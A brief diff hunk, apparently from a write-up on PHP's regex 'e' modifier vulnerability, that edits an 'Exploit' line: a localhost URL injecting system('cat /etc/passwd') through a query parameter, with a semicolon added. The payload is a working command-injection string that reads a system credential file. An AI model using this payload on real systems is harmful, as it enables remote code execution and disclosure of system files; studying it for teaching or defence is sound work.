@@ -48,5 +48,5 @@ adding e flag after regex the application executes the final string test as a ph
 ```
 
 #### Exploit 
-http://localhost/?new=system('cat /etc/passwd')&pattern=/user/e&base=Hello user
+http://localhost/?new=system('cat /etc/passwd');&pattern=/user/e&base=Hello user
 
